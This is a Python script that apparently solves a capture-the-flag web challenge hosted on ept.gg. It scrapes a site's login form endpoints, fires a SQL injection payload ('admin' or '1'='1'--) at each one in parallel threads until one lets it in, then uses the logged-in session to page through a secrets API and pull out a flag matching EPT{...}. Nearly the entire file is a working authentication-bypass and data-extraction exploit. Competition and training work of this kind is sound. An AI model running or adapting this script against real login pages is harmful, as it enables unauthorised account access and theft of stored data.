import requests
import threading
import re
import time


url = 'https://dragonslayerz-70ff-allthoseforms.ept.gg/login'
session = requests.Session()
injects = [
    "admin' or '1'='1'--",
    # "admin' or '1'='1",
    # "admin' or '1'='1'#",
]


def get_endpoints() -> list:
    response = requests.get(url)
    res = re.findall(r'action="/login/(.+?)"', response.text)
    return res


def check_for_sql(endpoint:str, inject:str):
    full = url + "/" + endpoint
    response = session.post(full, data={"username": inject, "password": "a" + inject}, allow_redirects=True)
    if "Invalid login credentials" in response.text:
        return True
    elif "Either the server is overloaded" in response.text:
        return False
    else:
        print(f"[!] SQL Injection found at {endpoint} with: >> {inject} <<")
        global vuln_endpoint
        vuln_endpoint = endpoint
        return True
        
def run_check(endpoint):
    for inject in injects:
        # print(f"{inject},", end="", flush=True)
        while check_for_sql(endpoint, inject) is False:
            time.sleep(0.3)


def goinject():
    find_endpoint()
    inject = "admin' or '1'='1'--"
    login = url + "/" + vuln_endpoint
    full = url.replace("/login","/api-docs")
    with requests.Session() as session:
        response = session.post(login, data={"username": inject, "password": inject}, allow_redirects=True)
        if response.status_code == 200:
            print(f"[+] Successfully injected at '{login}'")
            return session


def get_secrets(session):
    data = []
    full = url.replace("/login","/api/secrets")
    response = session.get(full, params={"page": 1, "page_size": 20})
    print(f"[+] Total pages: {response.json()['total_pages']}")
    print(f"[+] Starting to get secrets..")
    for i in range(2, response.json()["total_pages"]):
        print(".", end="", flush=True)
        response = session.get(full, params={"page": i, "page_size": 20})
        try:
            data.append(response.json()["secrets"])
        except requests.exceptions.JSONDecodeError:
            print(f"\n[!] Failed to decode JSON on page {i}, refreshing session\n")
            session = goinject()
    match = re.search(r'EPT\{.*?\}', str(data))
    if match:
        print(f"\n\n[+] Found secret: {match.group(0)}")


def find_endpoint():
    endpoints = get_endpoints()
    threads = []
    for endpoint in endpoints:
        # print(f"[+] Starting thread for {endpoint}")
        thread = threading.Thread(target=run_check, args=(endpoint,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    print("[+] Starting..")
    start_time = time.time()
   
    session = goinject()
    get_secrets(session)

    print(f"\n\n[+] Time taken: {time.time() - start_time}")
    print("[+] Done")